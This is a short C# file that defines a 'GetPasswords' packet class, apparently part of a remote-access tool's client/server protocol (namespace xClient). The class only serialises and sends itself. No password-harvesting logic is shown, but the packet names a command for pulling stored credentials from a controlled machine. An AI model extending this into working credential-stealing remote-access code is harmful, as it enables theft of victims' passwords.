using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetPasswords : IPacket
    {
        public GetPasswords()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
